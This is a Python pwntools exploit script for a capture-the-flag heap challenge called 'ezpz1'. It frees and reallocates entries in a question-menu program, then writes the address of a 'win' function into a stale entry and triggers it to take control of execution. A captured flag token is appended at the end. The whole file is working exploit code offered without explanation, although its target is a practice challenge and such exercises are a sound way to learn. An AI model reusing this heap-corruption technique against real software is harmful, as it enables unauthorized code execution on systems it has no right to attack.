#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./ezpz1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level = 'debug'
context.binary = exe
#context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','sp', '-V', '--title', 'gdb', 'bash', '-c']
context.terminal=['tmux','split','-h']
win_addr = exe.sym["win"] # win函数地址
def conn():
    if args.L:
        p = process([exe.path])
    else:
        p = remote(os.getenv("HOST", "127.0.0.1"), int(os.getenv("PORT", "8002")))
    return p
def dbg(p,bp=None):
    if bp is not None:
        gdb.attach(p, bp)
    else:
        gdb.attach(p)
    pause()



def create_question(p):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'C')

def ask_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'A')
    p.sendlineafter('Enter question id: ', str(qid))
def set_question(p, qid, content):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'S')
    p.sendlineafter('Enter question id: ', str(qid))
    p.sendlineafter('Enter your question: ', content)
def delete_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'd')
    p.sendlineafter('Enter question id: ', str(qid))

p = conn()
create_question(p)  # 创建问题0
create_question(p)  # 创建问题1

delete_question(p, 0)  # 删除问题0
delete_question(p, 1)  # 删除问题1
# dbg(p)
create_question(p)  # 创建问题0
# pause()
set_question(p, 2, p64(win_addr)+b'B' * 15)  # 利用缓冲区溢出覆盖返回地址

ask_question(p, 1)  # 触发函数调用
p.interactive()




#FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiOC1lenB6MSIsImlwIjoiMTIzLjEyMC45OC4yNDEiLCJzZXNzaW9uIjoiOGEwYTZlZDYtNThhMy00NjI4LWE1NWYtM2IxNWQzZmRjZTBiIn0.zwsEPH_wKFWA5xFmwhjWElkBcriIZLqYC2uG7DLHPzI}
